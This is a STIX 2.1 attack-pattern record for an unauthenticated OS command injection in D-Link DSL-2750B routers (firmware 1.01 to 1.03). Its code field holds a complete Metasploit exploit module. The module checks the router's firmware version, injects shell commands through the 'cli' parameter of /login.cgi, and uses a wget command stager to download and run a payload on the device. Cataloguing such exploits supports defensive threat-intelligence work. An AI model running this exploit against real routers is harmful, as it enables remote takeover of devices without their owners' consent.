{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4dfc5874-2672-49ce-a9df-ba4e025537a4",
    "created": "2024-08-14T17:04:38.553137Z",
    "modified": "2024-08-14T17:04:38.55314Z",
    "name": "D-Link DSL-2750B OS Command Injection",
    "description": "( This module exploits a remote command injection vulnerability in D-Link DSL-2750B devices. Vulnerability can be exploited through \"cli\" parameter that is directly used to invoke \"ayecli\" binary. Vulnerable firmwares are from 1.01 up to 1.03. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_dsl2750b_exec_noauth.rb",
            "external_id": "dlink_dsl2750b_exec_noauth.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2016/Feb/53"
        },
        {
            "source_name": "reference",
            "url": "http://www.quantumleap.it/d-link-router-dsl-2750b-firmware-1-01-1-03-rce-no-auth/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'D-Link DSL-2750B OS Command Injection',\n      'Description'    => %q(\n        This module exploits a remote command injection vulnerability in D-Link DSL-2750B devices.\n        Vulnerability can be exploited through \"cli\" parameter that is directly used to invoke\n        \"ayecli\" binary. Vulnerable firmwares are from 1.01 up to 1.03.\n      ),\n      'Author'         =>\n        [\n          'p@ql', # vulnerability discovery\n          'Marcin Bury <marcin[at]threat9.com>' # metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['PACKETSTORM', 135706],\n          ['URL', 'https://seclists.org/fulldisclosure/2016/Feb/53'],\n          ['URL', 'http://www.quantumleap.it/d-link-router-dsl-2750b-firmware-1-01-1-03-rce-no-auth/']\n        ],\n      'Targets'        =>\n        [\n          [\n            'Linux mipsbe Payload',\n            {\n              'Arch' => ARCH_MIPSBE,\n              'Platform' => 'linux'\n            }\n          ],\n          [\n            'Linux mipsel Payload',\n            {\n              'Arch' => ARCH_MIPSLE,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'DisclosureDate'  => '2016-02-05',\n      'DefaultTarget'   => 0))\n\n    deregister_options('CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => '/ayefeaturesconvert.js'\n    )\n\n    unless res\n      vprint_error('Connection failed')\n      return CheckCode::Unknown\n    end\n\n    unless res.code.to_i == 200 && res.body.include?('DSL-2750')\n      vprint_status('Remote host is not a DSL-2750')\n      return CheckCode::Safe\n    end\n\n    if res.body =~ /var AYECOM_FWVER=\"(\\d.\\d+)\";/\n      version = Regexp.last_match[1]\n      vprint_status(\"Remote host is a DSL-2750B with firmware version #{version}\")\n      if version >= \"1.01\" && version <= \"1.03\"\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    CheckCode::Safe\n  rescue ::Rex::ConnectionError\n    vprint_error('Connection failed')\n    return CheckCode::Unknown\n  end\n\n  def execute_command(cmd, _opts)\n    payload = Rex::Text.uri_encode(\"multilingual show';#{cmd}'\")\n    send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => '/login.cgi',\n        'vars_get' => {\n          'cli' => \"#{payload}$\"\n        },\n        'encode_params' => false\n      },\n      5\n    )\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} Failed to connect to the web server\")\n  end\n\n  def exploit\n    print_status(\"#{peer} Checking target version...\")\n\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')\n    end\n\n    execute_cmdstager(\n      flavor: :wget,\n      linemax: 200\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-02-05",
    "x_mitre_platforms": [
        "linux"
    ]
}